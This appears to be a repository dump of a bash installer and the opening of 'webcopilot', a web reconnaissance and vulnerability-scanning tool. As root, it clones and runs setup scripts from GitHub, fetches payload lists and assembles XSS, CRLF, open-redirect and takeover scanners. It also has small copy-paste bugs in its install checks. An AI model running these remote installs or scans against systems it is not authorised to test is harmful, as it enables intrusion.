/usr/bin/ 2> /dev/null\n        if [ -d ~/tools/urldedupe ]; then\n            echo -e \"${GREEN}[*]${NORMAL} urldedupe is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} urldedupe is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} urldedupe is already installed\"\n    fi\n\n    if [ ! -d ~/tools/openredirex ]; then\n        echo -e \"${YELLOW}[*]${NORMAL} openredirex could not be found ${LCYAN}[*]${NORMAL} Installing openredirex\"\n        cd && git clone https://github.com/devanshbatham/openredirex ~/tools/openredirex && cd ~/tools/openredirex && sudo chmod +x setup.sh && ./setup.sh 2> /dev/null\n        if [ -d ~/tools/urldedupe ]; then\n            echo -e \"${GREEN}[*]${NORMAL} openredirex is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} openredirex is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} openredirex is already installed\"\n    fi\n\n    if [ ! -d ~/tools/waymore ]; then\n        echo -e \"${YELLOW}[*]${NORMAL} waymore could not be found ${LCYAN}[*]${NORMAL} Installing waymore\"\n        ### Replace gau/gauplus, and waybackurls with waymore by xnl-h4ck3r - Visit here: (https://github.com/xnl-h4ck3r/waymore)\n        cd && git clone https://github.com/xnl-h4ck3r/waymore.git ~/tools/waymore && cd ~/tools/waymore && sudo pip3 install -r requirements.txt 2> /dev/null\n        if [ -d ~/tools/waymore ]; then\n            echo -e \"${GREEN}[*]${NORMAL} waymore is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} waymore is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} waymore is already installed\"\n    fi\n\n    if ! command -v findomain &> /dev/null; then\n        echo -e \"${YELLOW}[*]${NORMAL} findomain could not be found ${LCYAN}[*]${NORMAL} Installing findomain\"\n        cd ~/tools/ && wget https://github.com/Findomain/Findomain/releases/download/9.0.4/findomain-linux.zip && unzip findomain-linux.zip && chmod +x findomain && mv findomain /usr/bin/ 2> /dev/null\n        if command -v findomain &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} findomain is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} findomain is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} findomain is already installed\"\n    fi\n\n    if ! command -v uro &> /dev/null; then\n        echo -e \"${YELLOW}[*]${NORMAL} uro could not be found ${LCYAN}[*]${NORMAL} Installing uro\"\n        pip3 install uro\n        if command -v uro &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} uro is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} uro is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} uro is already installed\"\n    fi\n}\n\n# Install Wordlists\nwordlists(){\n    echo -e \"${LCYAN}[*]${NORMAL} Installing Wordlists and Payloads\"\n    local base_url=\"https://raw.githubusercontent.com\"\n    cd ~/wordlists/\n\n    # Define an associative array for files and URLs\n    declare -A files=(\n        [\"big.txt\"]=\"${base_url}/danielmiessler/SecLists/master/Discovery/Web-Content/big.txt\"\n        [\"dicc.txt\"]=\"https://gist.githubusercontent.com/Lopseg/33106eb13372a72a31154e0bbab2d2b3/raw/a79331799a70d0ae0ea906f2b143996d85f71de5/dicc.txt\"\n        [\"dns.txt\"]=\"${base_url}/danielmiessler/SecLists/master/Discovery/DNS/dns-Jhaddix.txt\"\n        [\"subdomains.txt\"]=\"${base_url}/danielmiessler/SecLists/master/Discovery/DNS/deepmagic.com-prefixes-top50000.txt\"\n        [\"resolvers.txt\"]=\"${base_url}//janmasarik/resolvers/master/resolvers.txt\"\n        [\"fuzz.txt\"]=\"${base_url}//Bo0oM/fuzz.txt/master/fuzz.txt\"\n        [\"payloads/lfi.txt\"]=\"${base_url}//R0X4R/Garud/master/.github/payloads/lfi.txt\"\n    )\n\n    # Iterate over the associative array\n    for file in \"${!files[@]}\"; do\n        if [ ! -f \"$file\" ]; then\n            echo -e \"${YELLOW}[*]${NORMAL} Downloading $file...\"\n            wget -O \"$file\" \"${files[$file]}\"\n        else\n            echo -e \"${GREEN}[*]${NORMAL} Skipping $file, already exists.\"\n        fi\n    done\n\n#     cd ~/wordlists/ && wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/big.txt\n#     cd ~/wordlists/ && wget https://gist.githubusercontent.com/Lopseg/33106eb13372a72a31154e0bbab2d2b3/raw/a79331799a70d0ae0ea906f2b143996d85f71de5/dicc.txt\n#     cd ~/wordlists/ && wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/dns-Jhaddix.txt -O dns.txt\n#     cd ~/wordlists/ && wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/deepmagic.com-prefixes-top50000.txt -O subdomains.txt\n#     cd ~/wordlists/ && wget https://raw.githubusercontent.com/janmasarik/resolvers/master/resolvers.txt -O resolvers.txt\n#     cd ~/wordlists/ && wget https://raw.githubusercontent.com/Bo0oM/fuzz.txt/master/fuzz.txt -O fuzz.txt\n#     cd ~/wordlists/payloads/ && wget https://raw.githubusercontent.com/R0X4R/Garud/master/.github/payloads/lfi.txt\n}\nsleep 2s\nclear\n\n# Install Go Tools\ngo_tools(){\n    echo -e \"${LCYAN}[*]${NORMAL} Installing Go Tools\"\n    if ! command -v anew &> /dev/null && [ ! -f ~/go/bin/anew ]; then\n        echo -e \"${YELLOW}[*]${NORMAL} anew could not be found ${LCYAN}[*]${NORMAL} Installing anew\"\n        go install -v github.com/tomnomnom/anew@latest 2> /dev/null\n        if command -v anew &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} anew is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} anew is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} anew is already installed\"\n    fi\n\n    if ! command -v gf &> /dev/null && [ ! -f ~/go/bin/gf ]; then\n        echo -e \"${YELLOW}[*]${NORMAL} gf could not be found ${LCYAN}[*]${NORMAL} Installing gf\"\n        go install -v github.com/tomnomnom/gf@latest 2> /dev/null\n        if command -v gf &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} gf is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} gf is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} gf is already installed\"\n    fi\n\n    if ! command -v aquatone &> /dev/null && [ ! -f ~/go/bin/aquatone ]; then\n        echo -e \"${YELLOW}[*]${NORMAL} aquatone could not be found ${LCYAN}[*]${NORMAL} Installing aquatone\"\n        go install -v github.com/michenriksen/aquatone@latest 2> /dev/null\n        if command -v aquatone &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} aquatone is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} aquatone is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} aquatone is already installed\"\n    fi\n\n    if ! command -v assetfinder &> /dev/null && [ ! -f ~/go/bin/assetfinder ]; then\n        echo -e \"${YELLOW}[*]${NORMAL} assetfinder could not be found ${LCYAN}[*]${NORMAL} Installing assetfinder\"\n        go install -v github.com/tomnomnom/assetfinder@latest 2> /dev/null\n        if command -v assetfinder &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} assetfinder is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} assetfinder is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} assetfinder is already installed\"\n    fi\n\n    ### Switch back to gau by lc (bp0lr/gauplus - discontinued) - Visit here: (https://github.com/lc/gau)\n    # if ! command -v gauplus &> /dev/null; then\n    #     echo -e \"${YELLOW}[*]${NORMAL} gauplus could not be found ${LCYAN}[*]${NORMAL} Installing gauplus\"\n    #     go install -v github.com/bp0lr/gauplus@latest 2> /dev/null\n    #     if command -v gauplus &> /dev/null; then\n    #         echo -e \"${GREEN}[*]${NORMAL} gauplus is installed successfully\"\n    #     else\n    #         echo -e \"${RED}[*]${NORMAL} gauplus is not installed successfully, Please install it manually\"\n    #     fi\n    # else\n    #     echo -e \"${GREEN}[*]${NORMAL} gauplus is already installed\"\n    # fi\n\n    if ! command -v gau &> /dev/null && [ ! -f ~/go/bin/gau ]; then\n        echo -e \"${YELLOW}[*]${NORMAL} gau could not be found ${LCYAN}[*]${NORMAL} Installing gau\"\n        go install -v github.com/lc/gau/v2/cmd/gau@latest 2> /dev/null\n        if command -v gau &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} gau is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} gau is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} gau is already installed\"\n    fi\n\n    if ! command -v waybackurls &> /dev/null && [ ! -f ~/go/bin/waybackurls ]; then\n        echo -e \"${YELLOW}[*]${NORMAL} waybackurls could not be found ${LCYAN}[*]${NORMAL} Installing waybackurls\"\n        go install -v github.com/tomnomnom/waybackurls@latest 2> /dev/null\n        if command -v waybackurls &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} waybackurls is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} waybackurls is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} waybackurls is already installed\"\n    fi\n\n    if ! command -v httpx &> /dev/null && [ ! -f ~/go/bin/httpx ]; then\n        echo -e \"${YELLOW}[*]${NORMAL} httpx could not be found ${LCYAN}[*]${NORMAL} Installing httpx\"\n        go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest 2> /dev/null\n        if command -v httpx &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} httpx is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} httpx is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} httpx is already installed\"\n    fi\n\n    if ! command -v amass &> /dev/null && [ ! -f ~/go/bin/amass ]; then\n        echo -e \"${YELLOW}[*]${NORMAL} amass could not be found ${LCYAN}[*]${NORMAL} Installing amass\"\n        go install -v github.com/owasp-amass/amass/v4/...@master 2> /dev/null\n        if command -v amass &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} amass is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} amass is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} amass is already installed\"\n    fi\n\n    if ! command -v kxss &> /dev/null && [ ! -f ~/go/bin/kxss ]; then\n        echo -e \"${YELLOW}[*]${NORMAL} kxss could not be found ${LCYAN}[*]${NORMAL} Installing kxss\"\n        go install -v github.com/Emoe/kxss@latest 2> /dev/null\n        if command -v kxss &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} kxss is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} kxss is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} kxss is already installed\"\n    fi\n\n    if ! command -v subjack &> /dev/null && [ ! -f ~/go/bin/subjack ]; then\n        echo -e \"${YELLOW}[*]${NORMAL} subjack could not be found ${LCYAN}[*]${NORMAL} Installing subjack\"\n        go install -v github.com/haccer/subjack@latest 2> /dev/null\n        if command -v subjack &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} subjack is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} subjack is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} subjack is already installed\"\n    fi\n\n    if ! command -v qsreplace &> /dev/null && [ ! -f ~/go/bin/qsreplace ]; then\n        echo -e \"${YELLOW}[*]${NORMAL} qsreplace could not be found ${LCYAN}[*]${NORMAL} Installing qsreplace\"\n        go install -v github.com/tomnomnom/qsreplace@latest 2> /dev/null\n        if command -v qsreplace &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} qsreplace is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} qsreplace is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} qsreplace is already installed\"\n    fi\n\n    if ! command -v dnsx &> /dev/null && [ ! -f ~/go/bin/dnsx ]; then\n        echo -e \"${YELLOW}[*]${NORMAL} dnsx could not be found ${LCYAN}[*]${NORMAL} Installing dnsx\"\n        go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest 2> /dev/null\n        if command -v dnsx &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} dnsx is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} dnsx is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} dnsx is already installed\"\n    fi\n\n    if ! command -v dalfox &> /dev/null && [ ! -f ~/go/bin/dalfox ]; then\n        echo -e \"${YELLOW}[*]${NORMAL} dalfox could not be found ${LCYAN}[*]${NORMAL} Installing dalfox\"\n        go install -v github.com/hahwul/dalfox/v2@latest 2> /dev/null\n        if command -v dalfox &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} dalfox is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} dalfox is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} dalfox is already installed\"\n    fi\n\n    if ! command -v crlfuzz &> /dev/null && [ ! -f ~/go/bin/crlfuzz ]; then\n        echo -e \"${YELLOW}[*]${NORMAL} crlfuzz could not be found ${LCYAN}[*]${NORMAL} Installing crlfuzz\"\n        GO111MODULE=on go install -v github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest 2> /dev/null\n        if command -v crlfuzz &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} crlfuzz is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} crlfuzz is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} crlfuzz is already installed\"\n    fi\n\n    if ! command -v nuclei &> /dev/null && [ ! -f ~/go/bin/nuclei ]; then\n        echo -e \"${YELLOW}[*]${NORMAL} nuclei could not be found ${LCYAN}[*]${NORMAL} Installing nuclei\"\n        go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest 2> /dev/null\n        if command -v nuclei &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} nuclei is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} nuclei is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} nuclei is already installed\"\n    fi\n\n    if ! command -v subfinder &> /dev/null && [ ! -f ~/go/bin/subfinder ]; then\n        echo -e \"${YELLOW}[*]${NORMAL} subfinder could not be found ${LCYAN}[*]${NORMAL} Installing subfinder\"\n        go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest 2> /dev/null\n        if command -v subfinder &> /dev/null; then\n            echo -e \"${GREEN}[*]${NORMAL} subfinder is installed successfully\"\n        else\n            echo -e \"${RED}[*]${NORMAL} subfinder is not installed successfully, Please install it manually\"\n        fi\n    else\n        echo -e \"${GREEN}[*]${NORMAL} subfinder is already installed\"\n    fi\n\n#     if ! command -v notify &> /dev/null && [ ! -f ~/go/bin/notify ]; then\n#         echo -e \"${YELLOW}[*]${NORMAL} notify could not be found ${LCYAN}[*]${NORMAL} Installing notify\"\n#         go install -v github.com/projectdiscovery/notify/cmd/notify@latest 2> /dev/null\n#         if command -v notify &> /dev/null; then\n#             echo -e \"${GREEN}[*]${NORMAL} notify is installed successfully\"\n#         else\n#             echo -e \"${RED}[*]${NORMAL} notify is not installed successfully, Please install it manually\"\n#         fi\n#     else\n#         echo -e \"${GREEN}[*]${NORMAL} notify is already installed\"\n#     fi\n}\n\nsleep 2s\nclear\ncd\n\n# Configure Tools and Setup Environment\nconfigs(){\n    echo -e \"${LCYAN}[*]${NORMAL} Configuring Tools and Setting Up Environment\"\n    \n    # Ensure .gf directory exists\n    mkdir -p ~/.gf\n\n    # Copy gf examples if they haven't been copied before\n    if [ ! -d \"~/.gf/examples\" ]; then\n        cp -r ~/go/src/github.com/tomnomnom/gf/examples ~/.gf/\n    fi\n\n    # Add gf completion to bashrc if it's not already there\n    if ! grep -q 'gf-completion.bash' ~/.bashrc; then\n        echo 'source ~/go/src/github.com/tomnomnom/gf/gf-completion.bash' >> ~/.bashrc\n    fi\n\n    # Add GOPATH/bin to PATH in bashrc if it's not already there\n    if ! grep -q 'GOPATH/bin' ~/.bashrc; then\n        echo 'export PATH=$PATH:$(go env GOPATH)/bin' >> ~/.bashrc\n    fi\n\n    # Clone Gf-Patterns and move json files if not already done\n    if [ ! -d \"~/Gf-Patterns\" ]; then\n        git clone https://github.com/1ndianl33t/Gf-Patterns ~/Gf-Patterns 2> /dev/null\n        mv ~/Gf-Patterns/*.json ~/.gf\n        rm -rf ~/Gf-Patterns\n    fi\n\n    # Clone Garud, move payloads, and clean up if not already done\n    if [ ! -d \"~/Garud\" ]; then\n        git clone https://github.com/R0X4R/Garud.git ~/Garud 2> /dev/null\n        mv ~/Garud/.github/payloads/patterns/*.json ~/.gf\n        rm -rf ~/Garud\n    fi\n\n    # # Ensure all binaries from go/bin are in /usr/bin if they aren't already there\n    # find ~/go/bin/ -type f -exec bash -c 'bin_file={}; base_bin=$(basename $bin_file); [ ! -f \"/usr/bin/$base_bin\" ] && sudo cp \"$bin_file\" /usr/bin/' \\;\n    sudo cp ~/go/bin/* /usr/bin/\n\n    # Update nuclei templates\n    nuclei -update-templates &> /dev/null\n\n    # echo -e \"${LCYAN}[*]${NORMAL} Configuring Tools and Setting Up Environment\"\n    # cp -r ~/go/src/github.com/tomnomnom/gf/examples ~/.gf/\n    # echo 'source ~/go/src/github.com/tomnomnom/gf/gf-completion.bash' >> ~/.bashrc\n    # echo 'export PATH=$PATH:$(go env GOPATH)/bin' >> ~/.bashrc\n    # git clone https://github.com/1ndianl33t/Gf-Patterns 2> /dev/null\n    # mv ~/Gf-Patterns/*.json ~/.gf\n    # git clone https://github.com/R0X4R/Garud.git 2> /dev/null\n    # mv ~/Garud/.github/payloads/patterns/*.json ~/.gf\n    # rm -rf ~/Garud ~/Gf-Patterns 2> /dev/null\n    # sudo cp ~/go/bin/* /usr/bin/\n    # nuclei -update-templates &> /dev/null\n}\nsleep 2s\nclear\n\n# Install Tools\necho -e \"${LCYAN}[*]${NORMAL} Installing Tools\"\nmain(){\n    dirs\n    dependencies\n    python_tools\n    wordlists\n    go_tools\n    configs\n    echo -e \"${GREEN}[*]${NORMAL} All Tools are installed successfully\"\n    # echo -e \"${YELLOW}[*]${NORMAL} Please configure notify API's in ${BOLD}${RED}~/.config/notify/provider-config.yaml${NORMAL} file\"\n    # echo -e \"${YELLOW}[*]${NORMAL}${BOLD} Don't forget to add your API keys in the config file of the tools\"\n    webcopilot -h 2> /dev/null\n}\n\nwhile true; do\n    main\n    exit\ndone"
        },
        {
          "name": "webcopilot",
          "type": "blob",
          "size": 34.1748046875,
          "content": "#!/bin/bash\n# Coded by: Harshit Raj Singh aKa G!2m0 @h4r5h1t\n# Inspired by: Garud and Pinaak by @ROX4R\n\n###################################################### [Version] ######################################################\nVERSION=\"2.0-beta\"\n\n###################################################### [Colors Output] ######################################################\nNORMAL=\"\\e[0m\"\t\t\t\nRED=\"\\033[0;31m\" \t\t\nGREEN=\"\\033[0;32m\"\t\t   \nBOLD=\"\\033[01;01m\"    \t\nWHITE=\"\\033[1;37m\"\t\t\nYELLOW=\"\\033[1;33m\"\t\nLRED=\"\\033[1;31m\"\t\t\nLGREEN=\"\\033[1;32m\"\t\t\nLBLUE=\"\\033[1;34m\"\t\t\t\nLCYAN=\"\\033[1;36m\"\t\t\nSORANGE=\"\\033[0;33m\"\t\t      \t\t\nDGRAY=\"\\033[1;30m\"\t\t\nDSPACE=\"  \"\nDTAB=\"\\t\\t\"\nTSPACE=\"   \"\nTTAB=\"\\t\\t\\t\"\nQSPACE=\"    \"\nQTAB=\"\\t\\t\\t\\t\"\nBLINK=\"\\e[5m\"\nTICK=\"\\u2714\"\nCROSS=\"\\u274c\"\n\n###################################################### [Prerequisites] ######################################################\n# Check if the script is run as root. If not, then exit.\nif [ \"$(id -u)\" != \"0\" ]; then\n    echo -e \"${YELLOW}[!] ${LRED}${BOLD}This script must be run as root${NORMAL}\" 1>&2\n    exit 1\nfi\n\n# Check if the internet is working. If not, then exit.\nwget -q --spider http://google.com\nif [ $? -ne 0 ]; then\n    echo -e \"${YELLOW}[!] ${LRED}${BOLD}Please check your internet connection${NORMAL}\"\n    exit 1\nfi\n\n###################################################### [Variables] ######################################################\ndomain=\noutput=\nexcl=\nthreads=\nbServer=\nallScanning=\nsubdomainFile=\n# quite=\n# subdomainFileContent=\n# domainList=()\n\n###################################################### [Banner] ######################################################\nbanner(){\necho -e \"\\n${BOLD}${LRED}                     \n                                ──────▄▀▄─────▄▀▄\n                                ─────▄█░░▀▀▀▀▀░░█▄\n                                ─▄▄──█░░░░░░░░░░░█──▄▄\n                                █▄▄█─█░░▀░░┬░░▀░░█─█▄▄█\n ██╗░░░░░░░██╗███████╗██████╗░░█████╗░░█████╗░██████╗░██╗██╗░░░░░░█████╗░████████╗\n░██║░░██╗░░██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║██║░░░░░██╔══██╗╚══██╔══╝\n░╚██╗████╗██╔╝█████╗░░██████╦╝██║░░╚═╝██║░░██║██████╔╝██║██║░░░░░██║░░██║░░░██║░░░\n░░████╔═████║░██╔══╝░░██╔══██╗██║░░██╗██║░░██║██╔═══╝░██║██║░░░░░██║░░██║░░░██║░░░\n░░╚██╔╝░╚██╔╝░███████╗██████╦╝╚█████╔╝╚█████╔╝██║░░░░░██║███████╗╚█████╔╝░░░██║░░░\n░░░╚═╝░░░╚═╝░░╚══════╝╚═════╝░░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚══════╝░╚════╝░░░░╚═╝░░░\"\necho -e \"${NORMAL}${BOLD}${QTAB}${DTAB}${DTAB}[●] ${LBLUE}Version: ${NORMAL}${VERSION}\"\necho -e \"${NORMAL}${BOLD}${QTAB}${DTAB}${DTAB}[●] ${BLINK}${LGREEN}@h4r5h1t${DGRAY} | ${LGREEN}G!2m0${NORMAL}\\n\"    \n\necho -e \"${NORMAL}\\n[${CROSS}] ${NORMAL}Warning: Use with caution. You are responsible for your own actions.${NORMAL}\"\necho -e \"${NORMAL}[${CROSS}] ${NORMAL}Developers assume no liability and are not responsible for any misuse or damage cause by this tool.${NORMAL}\\n\"\n}\n\n###################################################### [Usage] ######################################################\nusage() {\n    echo -e \"\\n${RED}${BOLD}Usage:${NORMAL}\"\n    echo -e \"${DGRAY}webcopilot -d <target>\"\n    echo -e \"${DGRAY}webcopilot -d <target> -a\"\n    echo -e \"${DGRAY}webcopilot [-d target] [-o output destination] [-t threads] [-b blind server URL] [-x exclude domains] [-f subdomains file] [-a] [-v] [-h]${NORMAL}\"\n    echo -e \"${LRED}${BOLD}Flags:${NORMAL}\"\n    echo -e \"  -d        Add your target [Optional]\"\n    echo -e \"  -o        To save outputs in folder [Default: webcopilot-<timestamp>]\"\n    # echo -e \"  -f        Specify a file containing domains [Optional]\"\n    echo -e \"  -t        Number of threads [Default: 100]\"\n    echo -e \"  -b        Add your server for BXSS [Default: False]\"\n    echo -e \"  -x        Exclude out of scope domains [Default: False]\"\n    echo -e \"  -f        Specify a file containing subdomains, this will skip subdomain enumeration [Optional]\"\n    echo -e \"  -a        Run all Enumeration by default it will run only subdomain enumeration [Default: False][${RED}Time Consuming${NORMAL}]\"\n    # echo -e \"  -s        Run only Subdomain Enumeration [Default: False]\"\n    # echo -e \"  -q        Run in quite mode [Default: False]\" \n    echo -e \"  -v        Show version of the tool\"\n    echo -e \"  -h        Show this help message\"\n    echo -e \"\\n${DGRAY}${BOLD}Example:${NORMAL}${GREEN}$0 ${NORMAL} -d ${YELLOW}domain.com${NORMAL} -a -o ${YELLOW}domain${NORMAL} -t ${YELLOW}333${NORMAL} -x ${YELLOW}exclude.txt${NORMAL} -b ${YELLOW}testServer.oast.fun${NORMAL}\"\n    echo -e \"You can use ${LBLUE} ${LBLUE}https://app.interactsh.com/${NORMAL} to get your server\" # Server for performing blind injections we can use burpcollabator too\n    exit 1\n}\n\n# If no arguments are supplied, then show usage\nif [ $# -eq 0 ]; then\n    banner\n    usage\n    exit 1\nfi\n\n# # Check if data is being piped into the script\n# if [ ! -t 0 ]; then\n#     # Read stdin into a variable\n#     subdomainFileContent=$(cat)\n# fi\n\n###################################################### [Parsing] ######################################################\n# Parse the command line arguments\nwhile getopts \":b:d:o:t:x:f:hav\" arg; do\n    case \"${arg}\" in\n        d) domain=${OPTARG} ;;\n        o) output=${OPTARG} ;;\n        t) threads=${OPTARG} ;;\n        x) excl=${OPTARG} ;;\n        a) allScanning=True ;;\n        b) bServer=${OPTARG} ;;\n        f) subdomainFile=${OPTARG} ;;\n        v) echo -e \"\\n${DGRAY}${BOLD}Version:${NORMAL}${GREEN} webcopilot ${VERSION}${NORMAL}\\n\" && exit 1 ;;\n        h | \\?) banner && usage && exit 1 ;;\n    esac\ndone\n        # d) domainList+=(\"${OPTARG}\") ;;\n        # f) while read -r line; do domainList+=(\"$line\"); done < \"${OPTARG}\" ;;\n        # q) quite=True ;;\n\n###################################################### [Pre-Checks] ######################################################\n# shift $((OPTIND -1))\n\n# # If no domain, subdomain file or pipe data is provided, then show usage\n# if [ -z \"$domain\" ] && [ -z \"$subdomainFile\" ] && [ -z \"$subdomainFileContent\" ]; then\n#     echo -e \"\\n${WHITE}[${CROSS}] ${LRED}${BOLD}Please provide a domain or subdomain file or pipe data${NORMAL}\"\n#     usage\n# fi\n\n# If no domain or subdomain file is provided, then show usage\nif [ -z \"$domain\" ] && [ -z \"$subdomainFile\" ]; then\n    echo -e \"\\n${WHITE}[${CROSS}] ${LRED}${BOLD}Please provide a domain or subdomain file${NORMAL}\"\n    usage\nfi\n\n# # Check if any domain is provided\n# if [ ${#domainList[@]} -eq 0 ]; then\n#     echo -e \"\\n${WHITE}[${CROSS}] ${LRED}${BOLD}Please enter a domain or provide a domains file${NORMAL}\"\n#     usage\n#     exit 1\n# fi\n\n# # If no output folder is specified, then use the domain name as the output folder\n# if [ -z \"$output\" ]\n#     then\n#     output=${domain#*://}\n# fi\n\n\n# If no output folder is specified, then use webcopilot-<timestamp> as the output folder\nif [ -z \"$output\" ]\n    then\n    output=webcopilot-$(date +%s)\nfi\n\n# If no threads are specified, then use 100 threads\nif [ -z \"$threads\" ]\n    then\n    threads=100\nfi\n\n# Make output directory if it doesn't exist already and change directory to it\nmkdir -p $output\ncd $output/\n\n###################################################### [Main] ######################################################\ninfo() {\n    if [ -z \"$domain\" ];then echo -e \"${NORMAL}${WHITE}\\nTarget:  ${RED}Subdomains File - ${subdomainFile} ${NORMAL}\"; else echo -e \"${NORMAL}${WHITE}\\nTarget:  ${RED}$domain${NORMAL}\"; fi\n    echo -e \"${NORMAL}${WHITE}Output:  ${GREEN}$(pwd)${NORMAL}\"\n    echo -e \"${NORMAL}${WHITE}Threads: ${GREEN}$threads${NORMAL}\"\n    if [ -z \"$bServer\" ];then echo -e \"${NORMAL}${WHITE}Server:  ${LRED}False${NORMAL}\"; else echo -e \"${NORMAL}${WHITE}Server:  ${LBLUE}$bServer${NORMAL}\"; fi\n    if [ -z \"$excl\" ];then echo -e \"${NORMAL}${WHITE}Exclude: ${LRED}False${NORMAL}\"; else echo -e \"${NORMAL}${WHITE}Exclude: ${GREEN}$excl${NORMAL}\"; fi\n    if [ -n \"$allScanning\" ];then  echo -e \"${NORMAL}${WHITE}Mode: ${GREEN}${TSPACE}Running all Enumeration${NORMAL}\"; else echo -e \"${NORMAL}${WHITE}Mode: ${GREEN}${TSPACE}Subdomain Enumeration${NORMAL}\"; fi\n    echo -e \"${NORMAL}${WHITE}Time: ${DGRAY}${TSPACE}$(date \"+%d-%m-%Y %H:%M:%S\")${NORMAL}\"\n    echo -e \"\\n${NORMAL}${WHITE}${BLINK}${BOLD}${LRED}[!]${NORMAL}${WHITE}${BOLD}${LRED} Please wait while scanning...${NORMAL}\"\n    # echo -e \"${NORMAL}${WHITE}${BLINK}${BOLD}${LRED}[!]${NORMAL}${WHITE}${BOLD}${LRED} Please be patient. This may take a while...${NORMAL}${NORMAL}\"\n}\n\n###################################################### [Passive Subdomain Enumeration] ######################################################\n\npassive_subenum() {\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Passive Subdomain Scanning is in progress:${NORMAL}\\n\"\n    echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Subdomain Scanning  -  ${NORMAL}[${RED}${BLINK}assetfinder${NORMAL}]\"\n    [ ! -f temp/assetfinder.txt ] && assetfinder --subs-only $domain | sort -u | anew -q temp/assetfinder.txt\n    echo -e \"\\033[2A\"\n    echo -ne \"${NORMAL}${BOLD}${SORANGE}\\n[●] Subdomain Scanned  -  ${NORMAL}[${GREEN}assetfinder${TICK}${NORMAL}]${DTAB} Subdomain Found: ${LGREEN}$(cat temp/assetfinder.txt 2> /dev/null | wc -l )\"\n    # echo -ne \"${NORMAL}${BOLD}${YELLOW}\\n[●] Subdomain Scanning  -  ${NORMAL}[${LRED}${BLINK}sublist3r${NORMAL}]\"\n    # [ ! -f temp/sublister.txt ] && python3 ~/tools/Sublist3r/sublist3r.py -d $domain -t $threads -o temp/sublister.txt &> /dev/null\n    # echo -e 